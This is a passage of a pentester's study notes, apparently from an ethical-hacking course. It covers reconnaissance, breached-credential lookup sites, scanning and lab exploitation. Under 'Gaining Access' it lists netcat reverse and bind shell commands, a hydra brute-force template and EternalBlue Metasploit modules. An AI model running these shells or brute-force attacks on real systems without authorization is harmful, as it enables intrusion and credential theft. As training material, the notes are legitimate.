  print(&quot;\nExiting program.&quot;)
  sys.exit()
except socket.gaierror:
  print(&quot;Hostname could not be resolved.&quot;)
  sys.exit()
except socker.error:
  print(&quot;Could not connect to server.&quot;)
  sys.exit()

</code></pre><h1 id="c455f2d3-dfe9-4149-bc24-23630fc698dc" class=""><strong>The Five stages of hacking</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#the-five-stages-of-hacking"></a></strong></h1><ol type="1" id="f14d7144-8c1d-492c-9df3-5299f4c1a261" class="numbered-list" start="1"><li>Reconnaissance<p id="a17843e3-836d-4cf7-aeb7-58cb9414e1e4" class="">Active vs Passive</p></li></ol><ol type="1" id="10f594c2-9429-4b94-b172-d774378eb044" class="numbered-list" start="2"><li>Scanning &amp; Enumeration<p id="9d92b630-afce-41df-b21c-efb1466e0350" class="">nmap, nessus, nikto etc</p></li></ol><ol type="1" id="8c0393e1-15a6-4b2d-849b-244dfa884b1c" class="numbered-list" start="3"><li>Gaining Access<p id="93b25dbb-f5dd-4ea9-b58c-ce03ae54dced" class="">exploitation</p></li></ol><ol type="1" id="2c68202f-585f-4713-9a9a-b862fcd746fc" class="numbered-list" start="4"><li>Maintaining Access</li></ol><ol type="1" id="de042bfc-af71-4a2f-839e-dbde485a220d" class="numbered-list" start="5"><li>Covering Tracks</li></ol><h2 id="2a2485fc-9d2e-47a5-8f81-13d94fac2365" class=""><strong>Reconnaissance</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#reconnaissance"></a></strong></h2><h3 id="cb154dc9-abcd-42ce-860d-251be2c7dba8" class=""><strong>Physical / Social assessment</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#physical--social-assessment"></a></strong></h3><p id="dccd0f17-c3d1-4a11-9c3d-2e7f939ad8dc" class="">Location Information:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e5bab62-3795-4f23-a376-4a36e37f570e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Satellite images
Drone recon
Building layout (badge readers, break areas, security, fencing)
Job Information
Employees (name, job title, phone number, manager, etc)
pictures (badge photos, desk photos, computer photos, etc)
</code></pre><h3 id="7c68007f-4145-45f4-99ad-e889ab1290b0" class=""><strong>Web / Host</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#web--host"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="417427bc-2834-4e22-9505-a6b4a62c7b15" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Target Validation:
  WHOIS, nslookup, dnsrecon

Finding Subdomains:
  Google Fu, dig, nmap, sublist3r, Bluto, crt.sh, etc

Fingerprinting:
  nmap, wappalyzer, whatweb, BuiltWIth, netcat

Data Breaches:
  HaveIBeenPwned, Breach-Parse, WeLeakInfo
</code></pre><h3 id="2e8d727f-daf7-4d64-9763-15a61b8ca775" class=""><strong>Identifying our targets</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#identifying-our-targets"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="008931de-e51b-42dd-abdc-c834f8df245c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">bugcrowd.com # find companies that we can scan in scope
hunter.io # find email addresses
phonebook.cz # list domains, emails
voilanorbert.com # find email addresses
clearbit connect # using within google account to find emails
tools.verifyemailaddress.io # email verification
email-checker.net/validate # email verification
</code></pre><h3 id="4f76dd4a-fa0f-4291-ac4c-e298ff6b3b7c" class=""><strong>Gather breachead credentials with breach-parse at wmaverickadams github</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#gather-breachead-credentials-with-breach-parse-at-wmaverickadams-github"></a></strong></h3><p id="765e510a-f801-4646-a523-1bae4b9f253c" class="">breach-parse has +40gb of files that were breached with the sh program, we can scan through this files</p><h3 id="e867d3bc-2ed3-45c9-b164-1e66a88ac3be" class=""><strong>Gather breached credentials with DeHashed</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#gather-breached-credentials-with-dehashed"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f0285d1-4a28-4724-aa88-eaebaec6abb0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">dehashed.com # search emails, phones, usernames, password, etc
hashes.org # search breached hashes
</code></pre><h3 id="15c96354-5708-4ed5-91ce-97fb1f5e6908" class=""><strong>Hunting subdomains</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#hunting-subdomains"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5f1a4eae-936b-4a07-8a3a-2b44fe1c84c2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sublist3r -d &lt;domain&gt;
crt.sh = %.&lt;domain&gt;  # search certificates that have been registered
owasp amass - github
tomnomnom/httprobe # github = to test the list of domains
</code></pre><h3 id="455d6970-0213-4ee9-b2fd-cf9cf5a819f2" class=""><strong>Identifying Website technologies</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#identifying-website-technologies"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="086f0c25-0579-4df5-80ea-e51c41f8b672" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">builtWith.com = Find out what websites are built with
wappalyzer - firefox extension = go to the website and run the extension
whatweb
burpsuite
social media = look &#x27;for&#x27; badges, names, pcs, etc
</code></pre><h3 id="a7c1ef9a-17a5-4fca-bf16-16591749909f" class=""><strong>Google Fu</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#google-fu"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="204f1bea-8857-49e1-a37b-01e7526c7b06" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site: &lt;&gt; filetype:&lt;&gt; -www +something
</code></pre><h2 id="bcde57bd-3b9d-4a00-aab5-3f57fa20caaa" class=""><strong>Scanning &amp; Enumeration</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#scanning--enumeration"></a></strong></h2><h3 id="8b3ec922-f9e5-4788-a5ec-ac6550dc52a6" class=""><strong>Network discover</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#network-discover"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bca666d6-81ee-4485-ba7f-158e8aee72ed" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">arp-scan -l
netdiscover -r
</code></pre><h3 id="75b7d4b4-9d82-49f4-92bf-9c996618eed3" class=""><strong>port scan</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#port-scan"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="957fcad5-9ffd-4251-a600-ccd0da764fb8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">NMAP
-sS = SYN SYN/ACK RST (its not send an ack back, thats the stealth mode)

nmap -T4 -p- -A -sC -sV -oA nmap/initial -vv

-sU = udp we may scan with -p only 1000 ports, cause it takes too long to finish
</code></pre><h3 id="6632cf9e-d589-416b-8d9b-8aab4c282b5c" class=""><strong>vulnerability scan</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#vulnerability-scan"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e416f014-837a-447b-ab5b-e13117d88bfc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nikto
</code></pre><h3 id="d0d3e008-5a5f-4f43-aff2-cbfb2310ac13" class=""><strong>directory scan</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#directory-scan"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="88ca262b-5662-4a13-be87-785cc0084131" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">dirb
dirbuster
gobuster
dirsearch
</code></pre><h3 id="5ff7b06a-d965-4702-a51a-44eac8f831c6" class=""><strong>scan SMB</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#scan-smb"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b213030-4bcd-48b3-a4db-b114f644f742" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">auxiliary/scanner/smb/smb_version
smbclient -L \\\\&lt;ip&gt;\\ = list the shares
smbclient \\\\&lt;ip&gt;\\&lt;share&gt; = open the share
</code></pre><h3 id="940eec83-a1f6-4d84-b9c6-cbea956ba250" class=""><strong>enumerate ssh</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#enumerate-ssh"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e723574d-9631-490c-b7c7-abd5dcf8364a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">\ssh &lt;ip&gt;
-oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
</code></pre><blockquote id="39faa4da-4dd9-40fa-95e2-9473ba0141b8" class="">just because the kioptrix1 is old, we need to add these informations sometimes we try to login without a login/pwd just to see if there is a banner with information that we can use</blockquote><h3 id="d64d01c2-e228-4c54-a9de-d6a4d19f48ff" class=""><strong>Researching potential vulnerablities</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#researching-potential-vulnerablities"></a></strong></h3><p id="b08c23c9-cffe-49b2-9c04-ad0b27b7b2f4" class="">Now we search with the applications and versions that we found earlier, and try to find any exploit that we can use:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dbd4f29d-b01c-41ee-9d13-33ddeb4ed129" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">with google:
  exploit-db
  rapid7

with searchsploit:
  -x = to see the code
  -m = to copy the exploit

with msfconsole:
  search
</code></pre><h3 id="420c7005-fc97-435e-a394-8aca425b5637" class=""><strong>Configuring Nessus</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#configuring-nessus"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ef16bca-b6ca-46a2-a00d-65c7d1e44c6a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">download &gt; start service &gt; get key with email &gt; enter localhost port 8834
use schedule option if u wanna *sleep more*

/opt/nessus/sbin/nessuscli lsuser # to list User
/opt/nessus/sbin/nessuscli chpasswd &lt;user&gt; # to change the password

</code></pre><h2 id="8c0387e0-ff63-4038-8c1b-621c0f6bcf90" class=""><strong>Gaining Access</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#gaining-access"></a></strong></h2><h3 id="cbc82e74-7b8d-4cc3-aca7-b2e5c5012d66" class=""><strong>Netcat Reverse Shell = the target connect to us - used the majority of the time</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#netcat-reverse-shell----the-target-connect-to-us---used-the-majority-of-the-time"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b3ed2cd-ef5c-4f35-ad2a-6f6315f36cdd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Kali:
nc -lvnp &lt;port&gt;

Target:
nc &lt;kali ip&gt; &lt;port&gt; -e /bin/sh
</code></pre><h3 id="3ed28962-630a-412e-98ba-ef3bee197f6a" class=""><strong>Netcat Bind Shell = we connect to target</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#netcat-bind-shell----we-connect-to-target"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e23dc8e-6a37-4651-9a39-45844309bc3a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Kali:
nc &lt;ip&gt; &lt;port&gt;

Target:
nc -lvnp &lt;port&gt; -e /bin/sh
</code></pre><h3 id="64339683-aff9-4670-8987-0176811903f2" class=""><strong>Non-staged vs staged payloads</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#non-staged-vs-staged-payloads"></a></strong></h3><p id="5381e196-05a0-446b-8503-087d71f63a74" class=""><strong>non-staged</strong> = send exploit shellcode all at once larger in size and wont always work example: windows/meterpreter_reverse_tcp</p><p id="7b058c16-30ec-436b-a724-411cf9bfa7be" class=""><strong>staged</strong> = send payloads in stages can be less stable example: windows/meterpreter/reverse_tcp</p><blockquote id="387b07ec-ee9d-4e58-a8fd-5d297331f8f7" class="">Tips - sometimes try to change the type of payload non-staged/staged</blockquote><h3 id="19be0252-69a0-4e81-8911-04854fd5e87f" class=""><strong>Exploits</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#exploits"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d792361a-4452-4a77-8bd1-1c2da789a8b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">searchsploit
msfconsole
</code></pre><h3 id="beaeb30e-787c-40ed-9934-487a12c55b93" class=""><strong>Bruteforce</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#bruteforce"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7c22d516-3734-48c2-b879-443a2e38248c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">hydra -l &lt;user&gt; -L &lt;user file&gt; -p &lt;password&gt; -P &lt;password file&gt; &lt;host&gt; &lt;service&gt; &lt;req:user/pwd:msg of failure&gt; -t &lt;threads&gt;

msfconsole &gt; auxiliary/scanner/ssh/ssh_login
</code></pre><h3 id="1ee98c1b-aa87-44e3-9592-5c2c3ca1b0d6" class=""><strong>Burp tips</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#burp-tips"></a></strong></h3><p id="27e2aec5-2b77-4ad1-a239-166687a1322a" class="">We can use sniper type of attack to attack one variable and use pitchfork if we need more than 1 variable in burp. Or cluster bomb if we need to try every login/pass possible. To do password spraying or credential stuffing</p><h2 id="1a07db61-7639-4c83-bd68-8feffc30bcd5" class=""><strong>Capstone</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#capstone"></a></strong></h2><h3 id="9e176412-2345-47e9-be92-2fadfb63033f" class=""><strong>Blue</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#blue"></a></strong></h3><p id="5634c131-9a0a-45df-92a2-7439edf17292" class="">With nmap we find that the target is using windows 7. searched exploits <em>for</em> w7 and got eternal blue - MS17-010</p><p id="f1711534-caed-49ac-8306-493534c21c88" class="">in msf:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8a40dfda-692f-479d-b8d1-172324327155" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">scanner/smb/smb_ms17_010
exploit/windows/smb/ms17_010_eternalblue &gt; check
</code></pre><p id="0f422c98-0a66-4b02-a402-aa1f1bd451bc" class="">To see if the machine is vulnerable to this exploit</p><p id="72a85dde-7911-41f9-ac1e-90c095e01dd3" class="">We can try manual exploit via github &gt; search for eternal blue, it might blue screen the machine.</p><blockquote id="f8a9ee83-f2ee-4c0a-a0a3-337b9fe72fa6" class="">Tips: In real environments confirm permission to run the exploit, cause it might broke the machine.</blockquote><h3 id="0aaf61fb-dff1-4e45-9a03-a8bcbce03c71" class=""><strong>Academy</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#academy"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="10c55324-e8b8-4c6d-9afe-b5fd63f097c3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">hash-identifier
ffuf -w &lt;wordlist&gt; -u &lt;url&gt;/FUZZ
</code></pre><blockquote id="7489e3e2-40af-436d-9df8-81e727a96f36" class="">systemctl list-timers = to see each programs/backups ir running in timers</blockquote><blockquote id="207a7d29-93de-4810-aeda-9d43a9ae84b4" class="">pspy - github = To see all program that are running in the system</blockquote><blockquote id="235540bf-cbde-45e9-9032-cd57961b9854" class="">[NOTE] ctrl+K in nano deletes a line</blockquote><h3 id="200d303c-09ab-4eb7-bbf7-82f3e417ab19" class=""><strong>Dev</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#dev"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 